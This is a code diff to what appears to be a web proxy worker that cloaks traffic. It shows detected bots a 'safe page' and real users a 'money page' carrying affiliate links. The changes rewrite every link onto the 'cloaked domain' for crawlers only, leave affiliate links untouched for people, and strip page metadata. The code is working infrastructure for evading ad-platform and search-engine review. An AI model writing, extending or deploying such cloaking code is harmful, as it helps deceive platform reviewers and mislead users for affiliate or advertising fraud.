@@ -1222,11 +1222,11 @@ async function handleMainRequest(request) {
         }
       });
     
-    // ✅ CRITICAL: Only apply asset rewriting to MONEY pages, not safe pages
-    // Safe pages should load their assets normally since they're legitimate websites
-    if (!isBot) {
-      // Only rewrite assets when showing money page to real users
-      // ✅ NO LINK REWRITING FOR MONEY PAGES - All <a href> links stay untouched
+    // ✅ CORRECT LOGIC: Safe pages get FULL rewriting, Money pages get asset rewriting only
+    const proxyDomain = requestUrl.hostname;
+    
+    if (isBot) {
+      // Safe pages (bots) get FULL rewriting including links so everything works properly
       rewriter
         .on('img', new AssetRewriter(baseTargetUrl, CDN_PATH, 'src'))
         .on('link[rel="stylesheet"]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'href'))
@@ -1235,10 +1235,27 @@ async function handleMainRequest(request) {
         .on('video', new AssetRewriter(baseTargetUrl, CDN_PATH, 'src'))
         .on('audio', new AssetRewriter(baseTargetUrl, CDN_PATH, 'src'))
         .on('link[rel="preload"]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'href'))
-        .on('link[rel="prefetch"]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'href'));
-      
-      // ✅ EXPLICITLY NO LINK REWRITING - Money page links stay exactly as they are
-      // No .on('a', new LinkRewriter(...)) - this ensures affiliate URLs work perfectly
+        .on('link[rel="prefetch"]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'href'))
+        .on('*', new AttributeRewriter(proxyDomain, baseTargetUrl, CDN_PATH, true))  // includeHref=true for bots
+        .on('head', new HeadRewriter())
+        .on('style', new StyleRewriter(proxyDomain, baseTargetUrl, CDN_PATH))
+        .on('*', new MetadataStripper());
+    } else {
+      // Money pages (real users) get asset rewriting only, NO LINK REWRITING
+      rewriter
+        .on('img', new AssetRewriter(baseTargetUrl, CDN_PATH, 'src'))
+        .on('link[rel="stylesheet"]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'href'))
+        .on('script[src]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'src'))
+        .on('source', new AssetRewriter(baseTargetUrl, CDN_PATH, 'src'))
+        .on('video', new AssetRewriter(baseTargetUrl, CDN_PATH, 'src'))
+        .on('audio', new AssetRewriter(baseTargetUrl, CDN_PATH, 'src'))
+        .on('link[rel="preload"]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'href'))
+        .on('link[rel="prefetch"]', new AssetRewriter(baseTargetUrl, CDN_PATH, 'href'))
+        .on('*', new AttributeRewriter(proxyDomain, baseTargetUrl, CDN_PATH, false))  // includeHref=false for money pages
+        .on('head', new HeadRewriter())
+        .on('style', new StyleRewriter(proxyDomain, baseTargetUrl, CDN_PATH))
+        .on('*', new MetadataStripper());
+      // Note: NO LinkRewriter for money pages - affiliate URLs stay untouched
     }
     
     const transformedResponse = rewriter.transform(response);
@@ -1457,21 +1474,64 @@ async function handleResourceRequest(request) {
 // Money pages have zero link rewriting, so all affiliate URLs work perfectly
 
 class AttributeRewriter {
-  constructor(proxyDomain, targetOrigin, cdnPath) {
+  constructor(proxyDomain, targetOrigin, cdnPath, includeHref = false) {
     this.proxyDomain = proxyDomain;
     this.targetOrigin = targetOrigin;
     this.cdnPath = cdnPath;
+    this.includeHref = includeHref;
   }
   
   element(element) {
-    // ✅ NO HREF REWRITING - Skip href attributes completely for money pages
-    const attributes = ['src', 'action', 'data-src', 'srcset']; // href removed!
+    // ✅ CONDITIONAL HREF REWRITING - Include href for safe pages (bots), exclude for money pages
+    const baseAttributes = ['src', 'action', 'data-src', 'srcset'];
+    const attributes = this.includeHref ? [...baseAttributes, 'href'] : baseAttributes;
+    
     for (let i = 0; i < attributes.length; i++) {
       const attr = attributes[i];
       const originalUrl = element.getAttribute(attr);
       if (originalUrl) {
         try {
-          let absoluteUrl;
+          // ✅ SPECIAL HANDLING FOR HREF ATTRIBUTES - Keep links on cloaked domain
+          if (attr === 'href') {
+            // Handle different types of links for href attributes
+            if (originalUrl.startsWith('http://') || originalUrl.startsWith('https://')) {
+              // Absolute URL - check if it's same domain as target
+              const linkUrl = new URL(originalUrl);
+              const targetUrl = new URL(this.targetOrigin);
+              if (linkUrl.hostname === targetUrl.hostname) {
+                // Same domain link - rewrite to cloaked domain with same path
+                const newHref = 'https://' + this.proxyDomain + linkUrl.pathname + linkUrl.search + linkUrl.hash;
+                element.setAttribute(attr, newHref);
+                console.log('🔗 Rewriting same-domain link:', originalUrl, '→', newHref);
+              }
+              // External links stay as-is
+            } else if (originalUrl.startsWith('//')) {
+              // Protocol-relative URL - check if same domain
+              const linkUrl = new URL('https:' + originalUrl);
+              const targetUrl = new URL(this.targetOrigin);
+              if (linkUrl.hostname === targetUrl.hostname) {
+                const newHref = 'https://' + this.proxyDomain + linkUrl.pathname + linkUrl.search + linkUrl.hash;
+                element.setAttribute(attr, newHref);
+                console.log('🔗 Rewriting protocol-relative link:', originalUrl, '→', newHref);
+              }
+            } else if (originalUrl.startsWith('/')) {
+              // Relative to domain root - always rewrite to cloaked domain
+              const newHref = 'https://' + this.proxyDomain + originalUrl;
+              element.setAttribute(attr, newHref);
+              console.log('🔗 Rewriting relative link:', originalUrl, '→', newHref);
+            } else if (originalUrl.startsWith('#')) {
+              // Anchor link - leave as-is
+            } else if (originalUrl.startsWith('mailto:') || originalUrl.startsWith('tel:') || originalUrl.startsWith('javascript:')) {
+              // Special protocols - leave as-is
+            } else {
+              // Relative path - rewrite to cloaked domain
+              const newHref = 'https://' + this.proxyDomain + '/' + originalUrl;
+              element.setAttribute(attr, newHref);
+              console.log('🔗 Rewriting relative path link:', originalUrl, '→', newHref);
+            }
+          } else {
+            // ✅ STANDARD ASSET HANDLING FOR NON-HREF ATTRIBUTES
+            let absoluteUrl;
           
           // Handle relative URLs and absolute URLs
           if (originalUrl.startsWith('http://') || originalUrl.startsWith('https://')) {
@@ -1488,8 +1548,6 @@ class AttributeRewriter {
             // Relative URL
             absoluteUrl = new URL(originalUrl, this.targetOrigin).href;
           }
-          
-          // Note: No affiliate URL protection needed here since href is excluded
           
           // Only rewrite if it's not already pointing to our proxy domain
           if (!absoluteUrl.includes(this.proxyDomain)) {
@@ -1524,6 +1582,7 @@ class AttributeRewriter {
               const encoded = btoa(absoluteUrl);
               element.setAttribute(attr, '/' + this.cdnPath + '/' + encoded);
             }
+          }
           }
         } catch (e) {
           console.warn('Failed to rewrite URL:', originalUrl, e.message);
